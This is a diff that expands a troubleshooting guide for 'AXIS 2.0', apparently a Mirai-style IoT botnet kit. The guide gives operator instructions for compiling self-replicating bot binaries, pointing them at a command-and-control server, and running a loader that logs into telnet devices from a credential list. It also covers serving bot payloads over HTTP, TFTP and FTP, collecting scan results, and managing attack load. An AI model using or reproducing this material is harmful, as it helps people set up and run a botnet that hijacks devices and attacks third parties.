@@ -1,48 +1,86 @@
 ================================================================================
                     AXIS 2.0 TROUBLESHOOTING GUIDE
+                  Comprehensive Problem Resolution Guide
 ================================================================================
 
-Common issues and solutions for AXIS 2.0 installation and operation.
+This guide covers all known issues and their solutions for AXIS 2.0.
 
 ================================================================================
 BUILD ISSUES
 ================================================================================
 
 PROBLEM: "gcc: command not found"
-SOLUTION: 
-  Ubuntu/Debian: apt install build-essential
-  CentOS: yum install gcc gcc-c++ make
+SOLUTION:
+  Ubuntu/Debian: apt install build-essential gcc
+  CentOS/RHEL: yum install gcc gcc-c++ make
+  Verify: gcc --version
 
 --------------------------------------------------------------------------------
 
 PROBLEM: "go: command not found"
 SOLUTION:
-  export PATH=$PATH:/usr/local/go/bin
-  echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
+  Ubuntu/Debian: apt install golang-go
+  Or install from source:
+    wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
+    tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
+    export PATH=$PATH:/usr/local/go/bin
+    echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
+  Verify: go version
 
 --------------------------------------------------------------------------------
 
 PROBLEM: "cannot find -lmysqlclient"
 SOLUTION:
   Ubuntu/Debian: apt install libmysqlclient-dev
-  CentOS: yum install mysql-devel
+  CentOS/RHEL: yum install mysql-devel
+  Then rebuild: cd cnc && go build -o ../cnc_server .
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Go module errors (go.mod issues)
+SOLUTION:
+  cd cnc
+  rm -f go.mod go.sum
+  go mod init production-cnc
+  go get github.com/go-sql-driver/mysql
+  go get github.com/mattn/go-shellwords
+  go build -o ../cnc_server .
 
 --------------------------------------------------------------------------------
 
 PROBLEM: Cross-compiler not found for architecture
 SOLUTION:
-  # Skip that architecture or install compiler
-  Ubuntu: apt install gcc-arm-linux-gnueabi
-  Or edit build.sh and comment out that architecture
+  # Install specific compiler
+  Ubuntu: apt install gcc-arm-linux-gnueabi gcc-mips-linux-gnu
+  
+  # Or skip that architecture in build.sh
+  # Comment out the architecture in the ARCH_CC array
+  
+  # Build only native architecture
+  cd bot
+  gcc -std=gnu99 -DKILLER -DSELFREP -DWATCHDOG -O3 -o ../bins/axis.x86_64 *.c
 
 --------------------------------------------------------------------------------
 
-PROBLEM: "package not found" for Go dependencies
+PROBLEM: Bot build fails with "undefined reference"
 SOLUTION:
-  cd cnc
-  go mod init production-cnc
-  go get github.com/go-sql-driver/mysql
-  go get github.com/mattn/go-shellwords
+  # Check all source files are included
+  cd bot
+  ls *.c
+  
+  # Build with all files
+  gcc -std=gnu99 -DKILLER -DSELFREP -DWATCHDOG -O3 -o ../bins/axis.x86_64 *.c
+  
+  # Check for missing headers
+  grep -r "#include" *.c | grep -v ".h:"
+
+--------------------------------------------------------------------------------
+
+PROBLEM: "permission denied" when building
+SOLUTION:
+  chmod +x build.sh
+  chmod 755 /root/AXIS\ 2.0
+  ./build.sh
 
 ================================================================================
 DATABASE ISSUES
@@ -55,37 +93,76 @@ SOLUTION:
   
   # Start if not running
   systemctl start mariadb
+  systemctl enable mariadb
   
-  # Check configuration
+  # Check it's listening
   netstat -tulpn | grep 3306
+  
+  # Check bind address in /etc/mysql/mariadb.conf.d/50-server.cnf
+  # Should be: bind-address = 127.0.0.1
 
 --------------------------------------------------------------------------------
 
-PROBLEM: "Access denied for user"
+PROBLEM: "Access denied for user 'axis'@'localhost'"
 SOLUTION:
-  # Reset database credentials
+  # Reset credentials
   mysql -u root -p << EOF
-  UPDATE mysql.user SET Password=PASSWORD('axis123') WHERE User='axis';
+  ALTER USER 'axis'@'localhost' IDENTIFIED BY 'axis_secure_pass_2024!';
+  FLUSH PRIVILEGES;
+  EOF
+  
+  # Or recreate user
+  mysql -u root -p << EOF
+  DROP USER IF EXISTS 'axis'@'localhost';
+  CREATE USER 'axis'@'localhost' IDENTIFIED BY 'axis_secure_pass_2024!';
+  GRANT ALL PRIVILEGES ON AXIS2.* TO 'axis'@'localhost';
   FLUSH PRIVILEGES;
   EOF
 
 --------------------------------------------------------------------------------
 
-PROBLEM: "Database not found"
+PROBLEM: "Database 'AXIS2' doesn't exist"
 SOLUTION:
-  # Create database
-  mysql -u root -p -e "CREATE DATABASE AXIS2;"
-  mysql -u root -p < database.sql
+  mysql -u root -p << EOF
+  CREATE DATABASE IF NOT EXISTS AXIS2;
+  USE AXIS2;
+  SOURCE /root/AXIS\ 2.0/database.sql;
+  EOF
 
 --------------------------------------------------------------------------------
 
-PROBLEM: Tables not created
+PROBLEM: Tables not created / Schema errors
 SOLUTION:
-  # Manually run SQL
-  mysql -u root -p AXIS2 < database.sql
+  # Drop and recreate
+  mysql -u root -p << EOF
+  DROP DATABASE IF EXISTS AXIS2;
+  CREATE DATABASE AXIS2;
+  USE AXIS2;
+  SOURCE /root/AXIS\ 2.0/database.sql;
+  EOF
   
   # Verify tables
   mysql -u root -p -e "USE AXIS2; SHOW TABLES;"
+
+--------------------------------------------------------------------------------
+
+PROBLEM: "Table 'AXIS2.users' doesn't exist"
+SOLUTION:
+  # Manually create tables
+  mysql -u root -p AXIS2 < /root/AXIS\ 2.0/database.sql
+  
+  # Or check if import worked
+  mysql -u root -p -e "USE AXIS2; SELECT COUNT(*) FROM users;"
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Admin login fails
+SOLUTION:
+  # Reset admin password
+  mysql -u root -p AXIS2 -e "UPDATE users SET password='admin123' WHERE username='admin';"
+  
+  # Verify user exists
+  mysql -u root -p AXIS2 -e "SELECT username, password FROM users WHERE admin=1;"
 
 ================================================================================
 C&C SERVER ISSUES
@@ -93,68 +170,105 @@ C&C SERVER ISSUES
 
 PROBLEM: C&C won't start
 SOLUTION:
-  # Check database connection in cnc/main.go
-  # Verify credentials match database
-  # Check if port is in use
-  netstat -tulpn | grep 3778
-  
-  # Kill existing process
+  # Check if already running
+  ps aux | grep cnc_server
   killall cnc_server
+  
+  # Check database connection in cnc/main.go
+  # Verify: DatabaseAddr, DatabaseUser, DatabasePass
+  
+  # Check port availability
+  netstat -tulpn | grep 3778
+  lsof -i :3778
+  
+  # Start with debug output
+  cd /root/AXIS\ 2.0
   ./cnc_server
 
 --------------------------------------------------------------------------------
 
-PROBLEM: "Address already in use"
+PROBLEM: "Address already in use" error
 SOLUTION:
   # Find process using port
   lsof -i :3778
+  lsof -i :3777
+  lsof -i :3779
   
   # Kill process
   kill -9 [PID]
   
-  # Or change port in main.go
+  # Or change port in cnc/main.go
 
 --------------------------------------------------------------------------------
 
-PROBLEM: Admin can't login
+PROBLEM: TLS certificate errors
 SOLUTION:
-  # Reset admin password
-  mysql -u root -p AXIS2 -e "UPDATE users SET password='admin123' WHERE username='admin';"
+  # Remove old certificates and regenerate
+  rm -f tls_cert.pem tls_key.pem
   
-  # Verify user exists
-  mysql -u root -p AXIS2 -e "SELECT * FROM users;"
+  # Restart C&C server
+  killall cnc_server
+  ./cnc_server
+  
+  # Certificates will be auto-generated
 
 --------------------------------------------------------------------------------
 
 PROBLEM: API not working
 SOLUTION:
-  # Check API port is open
+  # Check API is enabled in cnc/main.go
+  # APIListenAddr should not be empty
+  
+  # Check port is open
   netstat -tulpn | grep 3779
   
-  # Verify API code in database
-  mysql -u root -p AXIS2 -e "SELECT api_key FROM users;"
+  # Test API
+  curl http://localhost:3779/api/botnet/status
+  
+  # Check API key in database
+  mysql -u root -p AXIS2 -e "SELECT api_key FROM users WHERE username='admin';"
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Bots connect but don't show in panel
+SOLUTION:
+  # Check database connection
+  # Check clientList.go for any errors
+  
+  # Verify bot is sending proper handshake
+  # Check logs for bot connection messages
+  
+  # Restart C&C server
+  killall cnc_server
+  ./cnc_server
 
 ================================================================================
 BOT CONNECTION ISSUES
 ================================================================================
 
-PROBLEM: Bots won't connect
+PROBLEM: Bots won't connect to C&C
 SOLUTION:
   # Check CNC_ADDR in bot/config.h
-  # Verify server IP is correct
+  grep CNC_ADDR bot/config.h
+  
+  # Should be your server IP, not 127.0.0.1
+  
+  # Rebuild bot with correct IP
+  cd bot
+  sed -i 's/CNC_ADDR "127.0.0.1"/CNC_ADDR "YOUR_SERVER_IP"/' config.h
+  gcc -std=gnu99 -DKILLER -DSELFREP -DWATCHDOG -O3 -o ../bins/axis.x86_64 *.c
+  
   # Check firewall allows port 3778
+  ufw allow 3778/tcp
   
   # Test connection
-  telnet [SERVER_IP] 3778
-  
-  # Check C&C is running
-  ps aux | grep cnc_server
+  telnet YOUR_SERVER_IP 3778
 
 --------------------------------------------------------------------------------
 
-PROBLEM: Bots connect then disconnect
+PROBLEM: Bots connect then immediately disconnect
 SOLUTION:
-  # Check ulimit
+  # Check ulimit for file descriptors
   ulimit -n 999999
   
   # Check server resources
@@ -163,16 +277,33 @@ SOLUTION:
   
   # Check for OOM killer
   dmesg | grep -i "killed process"
+  
+  # Check C&C logs for disconnect reason
 
 --------------------------------------------------------------------------------
 
 PROBLEM: Wrong architecture detected
 SOLUTION:
-  # Check loader architecture detection
-  # Verify binary exists for architecture
-  ls -la /var/www/html/bins/
+  # Check what architecture was built
+  file bins/axis.*
   
-  # Add missing architecture binary
+  # Build for correct architecture
+  # Or use universal build script
+  ./build.sh
+  
+  # Verify binary exists for target architecture
+  ls -la /var/www/html/bins/
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Bots not executing commands
+SOLUTION:
+  # Check bot has proper permissions
+  # Check if killer is interfering
+  # Verify CNC_ADDR is correct
+  
+  # Test with simple command
+  # Check bot logs if available
 
 ================================================================================
 LOADER ISSUES
@@ -180,39 +311,49 @@ LOADER ISSUES
 
 PROBLEM: Loader won't start
 SOLUTION:
-  # Check if binary exists
+  # Check binary exists and is executable
   ls -la loader
+  chmod +x loader
   
   # Check dependencies
   ldd loader
   
   # Rebuild loader
-  cd loader && gcc -o ../loader *.c -lpthread
+  cd loader
+  gcc -std=gnu99 -O3 -o ../loader *.c -lpthread
 
 --------------------------------------------------------------------------------
 
-PROBLEM: No successful logins
+PROBLEM: No successful logins from loader
 SOLUTION:
-  # Check credential list
+  # Check credential list format
   cat list.txt
+  # Format should be: IP:PORT user:pass
   
-  # Verify format: IP:PORT user:pass
+  # Verify telnet is accessible on targets
+  nc -zv TARGET_IP 23
   
-  # Check telnet port is accessible
-  nc -zv [TARGET_IP] 23
+  # Check loader config
+  cat loader/config.h
+  
+  # Run loader in foreground for debugging
+  ./loader
 
 --------------------------------------------------------------------------------
 
-PROBLEM: Upload fails
+PROBLEM: Upload fails after login
 SOLUTION:
   # Check web server is running
   systemctl status apache2
   
-  # Verify bins directory permissions
-  chmod 777 /var/www/html/bins
+  # Verify binaries exist
+  ls -la /var/www/html/bins/
   
-  # Test download
-  wget http://[SERVER_IP]/bins/axis.x86_64
+  # Test download from server
+  wget http://YOUR_SERVER_IP/bins/axis.x86_64
+  
+  # Check permissions
+  chmod 644 /var/www/html/bins/*
 
 ================================================================================
 SCANNER ISSUES
@@ -220,31 +361,52 @@ SCANNER ISSUES
 
 PROBLEM: scanListen won't start
 SOLUTION:
-  # Check port is free
+  # Check if port is in use
   netstat -tulpn | grep 9555
   
   # Check binary exists
   ls -la scanListen
   
   # Rebuild
+  cd /root/AXIS\ 2.0
   go build -o scanListen scanListen.go
+  
+  # Start
+  ./scanListen &
 
 --------------------------------------------------------------------------------
 
-PROBLEM: No scan results
+PROBLEM: No scan results coming in
 SOLUTION:
   # Check scanner is running on bots
-  # Verify SCAN_CB_PORT in bot config
+  # Verify SCAN_CB_PORT in bot/config.h is 9555
+  
   # Check firewall allows port 9555
+  ufw allow 9555/tcp
   
   # Test manually
   echo -e "\x00\x00\x00\x00" | nc localhost 9555
+  
+  # Check scanListen logs
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Scanners not finding targets
+SOLUTION:
+  # Check IP ranges in scanner files
+  # Verify get_random_ip() functions
+  
+  # Check scanner is enabled in bot
+  # SELFREP should be defined in config.h
+  
+  # Monitor scanner output
+  tail -f telnet.txt
 
 ================================================================================
 WEB SERVER ISSUES
 ================================================================================
 
-PROBLEM: Binaries not downloading
+PROBLEM: Binaries not downloading (404 error)
 SOLUTION:
   # Check Apache is running
   systemctl status apache2
@@ -254,25 +416,49 @@ SOLUTION:
   
   # Check permissions
   chmod 644 /var/www/html/bins/*
+  chown www-data:www-data /var/www/html/bins/*
   
   # Test download
-  curl http://[SERVER_IP]/bins/axis.x86_64
+  curl -I http://YOUR_SERVER_IP/bins/axis.x86_64
+  
+  # Check Apache error log
+  tail -f /var/log/apache2/error.log
 
 --------------------------------------------------------------------------------
 
 PROBLEM: TFTP not working
 SOLUTION:
-  # Check TFTP is running
+  # Check TFTP service
   systemctl status tftpd-hpa
+  systemctl status xinetd
   
   # Verify directory
   ls -la /var/lib/tftpboot/
   
-  # Check xinetd
-  systemctl status xinetd
+  # Check permissions
+  chmod 777 /var/lib/tftpboot/
+  
+  # Test TFTP
+  tftp localhost -c get axis.x86_64
+
+--------------------------------------------------------------------------------
+
+PROBLEM: FTP not working
+SOLUTION:
+  # Check vsftpd
+  systemctl status vsftpd
+  
+  # Verify directory
+  ls -la /var/ftp/
+  
+  # Check vsftpd config
+  cat /etc/vsftpd.conf
+  
+  # Test FTP
+  ftp localhost
 
 ================================================================================
-FIREWALL ISSUES
+FIREWALL & NETWORK ISSUES
 ================================================================================
 
 PROBLEM: Can't connect to server
@@ -282,17 +468,21 @@ SOLUTION:
   firewall-cmd --list-all
   
   # Open required ports
-  ufw allow 3778/tcp
-  ufw allow 3779/tcp
-  ufw allow 9555/tcp
-  ufw allow 80/tcp
+  ufw allow 22/tcp    # SSH
+  ufw allow 80/tcp    # HTTP
+  ufw allow 3777/tcp  # Admin TLS
+  ufw allow 3778/tcp  # Bot connections
+  ufw allow 3779/tcp  # API
+  ufw allow 9555/tcp  # Scan results
+  ufw allow 69/udp    # TFTP
   
-  # Or disable for testing
+  # Or temporarily disable for testing
   ufw disable
+  ufw enable
 
 --------------------------------------------------------------------------------
 
-PROBLEM: SELinux blocking
+PROBLEM: SELinux blocking services
 SOLUTION:
   # Check status
   getenforce
@@ -302,6 +492,19 @@ SOLUTION:
   
   # Or configure properly
   setsebool -P httpd_can_network_connect 1
+  setsebool -P ftpd_full_access 1
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Port forwarding issues (NAT)
+SOLUTION:
+  # Configure port forwarding on router
+  # Forward external ports to server internal IP
+  
+  # Or use DMZ for testing (not recommended for production)
+  
+  # Verify with
+  curl ifconfig.me
 
 ================================================================================
 PERFORMANCE ISSUES
@@ -313,97 +516,202 @@ SOLUTION:
   htop
   df -h
   free -h
+  iostat -x 1
   
   # Increase ulimit
   ulimit -n 999999
   ulimit -u 999999
   
-  # Check for too many connections
+  # Add to /etc/security/limits.conf:
+  * soft nofile 999999
+  * hard nofile 999999
+  
+  # Check connections
   netstat -an | grep ESTABLISHED | wc -l
+  
+  # Check for DDoS
+  netstat -an | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
 
 --------------------------------------------------------------------------------
 
 PROBLEM: High CPU usage
 SOLUTION:
-  # Check attack load
-  # Reduce max bots per user
+  # Check what's using CPU
+  top -c
+  
+  # Reduce attack load
   # Limit concurrent attacks in database
+  # Reduce max bots per user
+  
+  # Check for runaway processes
+  ps aux --sort=-%cpu | head -10
 
 --------------------------------------------------------------------------------
 
 PROBLEM: Running out of disk space
 SOLUTION:
-  # Clear old logs
-  > logs/commands.txt
-  > logs/logins.txt
-  > telnet.txt
+  # Check disk usage
+  df -h
   
-  # Rotate logs
-  logrotate -f /etc/logrotate.conf
+  # Clear old logs
+  > /root/AXIS\ 2.0/logs/commands.txt
+  > /root/AXIS\ 2.0/logs/logins.txt
+  > /root/AXIS\ 2.0/telnet.txt
+  
+  # Configure log rotation
+  cat > /etc/logrotate.d/axis2 << EOF
+  /root/AXIS\ 2.0/logs/*.txt {
+      daily
+      rotate 7
+      compress
+      delaycompress
+      notifempty
+      create 0644 root root
+  }
+  EOF
 
 ================================================================================
 LOG FILES
 ================================================================================
 
-C&C Logs:
-  logs/commands.txt - Admin commands
-  logs/logins.txt - Login attempts
+C&C Server Logs:
+  /root/AXIS 2.0/logs/commands.txt - Admin commands executed
+  /root/AXIS 2.0/logs/logins.txt - Admin login attempts
 
 Scanner Logs:
-  telnet.txt - Scan results
+  /root/AXIS 2.0/telnet.txt - Scan results and successful logins
 
 System Logs:
   /var/log/syslog - System messages
-  /var/log/auth.log - Authentication
-  /var/log/apache2/error.log - Web server
+  /var/log/auth.log - SSH and authentication
+  /var/log/apache2/access.log - Web access
+  /var/log/apache2/error.log - Web errors
+  /var/log/mysql/error.log - Database errors
 
-Database Logs:
-  /var/log/mysql/error.log
+Loader Logs:
+  Output to stdout/stderr when running
 
 ================================================================================
 DEBUG MODE
 ================================================================================
 
-Enable debug output:
+Enable debug output for troubleshooting:
 
-# C&C Server
-Edit cnc/main.go, add fmt.Println() statements
+C&C Server Debug:
+  Edit cnc/main.go, add:
+  fmt.Println("Debug:", variable)
+  
+  Rebuild: go build -o ../cnc_server .
 
-# Bot
-Recompile with debug flags:
-gcc -DDEBUG -g -o bot bot/*.c
+Bot Debug:
+  Recompile with debug flags:
+  gcc -DDEBUG -g -o bot bot/*.c
+  
+  Or add printf statements in code
 
-# Loader
-Run with strace:
-strace -f ./loader
+Loader Debug:
+  Run with strace:
+  strace -f ./loader
+  
+  Or with ltrace:
+  ltrace ./loader
+
+Network Debug:
+  # Capture packets
+  tcpdump -i any port 3778 -w capture.pcap
+  
+  # Analyze with Wireshark
+  wireshark capture.pcap
 
 ================================================================================
-GETTING HELP
+COMMON DIAGNOSTIC COMMANDS
 ================================================================================
-
-1. Check this troubleshooting guide
-2. Review installation tutorials
-3. Check log files for errors
-4. Verify all services are running
-5. Test each component individually
-
-Common diagnostic commands:
 
 # Check all services
-ps aux | grep -E 'cnc|scan|loader'
+ps aux | grep -E 'cnc_server|scanListen|loader|apache2|mariadb'
 
 # Check all ports
-netstat -tulpn
+netstat -tulpn | grep -E '3777|3778|3779|9555|80|3306'
 
-# Check database
-mysql -u axis -paxis123 AXIS2 -e "SHOW STATUS;"
+# Check database health
+mysql -u axis -p'axis_secure_pass_2024!' AXIS2 -e "SHOW STATUS;"
 
 # Check web server
 curl -I http://localhost/bins/
+curl http://localhost/bins/axis.x86_64 > /dev/null
 
 # Check system resources
 htop
 df -h
 free -h
+uname -a
 
+# Check for zombies
+ps aux | grep Z
+
+# Check open files
+lsof -i
+
+# Check DNS resolution
+nslookup your-domain.com
+dig your-domain.com
+
+================================================================================
+EMERGENCY PROCEDURES
+================================================================================
+
+PROBLEM: Complete system failure
+SOLUTION:
+  # Stop all services
+  killall cnc_server scanListen loader apache2
+  systemctl stop mariadb
+  
+  # Backup database
+  mysqldump -u root -p AXIS2 > emergency_backup.sql
+  
+  # Backup binaries
+  tar -czf emergency_bins.tar.gz /var/www/html/bins/
+  
+  # Reinstall from scratch
+  # Follow QUICK_SETUP.txt from beginning
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Database corruption
+SOLUTION:
+  # Stop MariaDB
+  systemctl stop mariadb
+  
+  # Run repair
+  myisamchk -r /var/lib/mysql/AXIS2/*.MYI
+  
+  # Or restore from backup
+  mysql -u root -p < emergency_backup.sql
+  
+  # Start MariaDB
+  systemctl start mariadb
+
+================================================================================
+GETTING HELP
+================================================================================
+
+Before asking for help:
+
+1. Check this troubleshooting guide
+2. Review QUICK_SETUP.txt
+3. Check all log files
+4. Verify all services are running
+5. Test each component individually
+6. Run diagnostic commands above
+
+When asking for help, provide:
+
+1. Error messages (exact text)
+2. Output of diagnostic commands
+3. Relevant log excerpts
+4. What you were trying to do
+5. What you've already tried
+
+================================================================================
+END OF TROUBLESHOOTING GUIDE
 ================================================================================
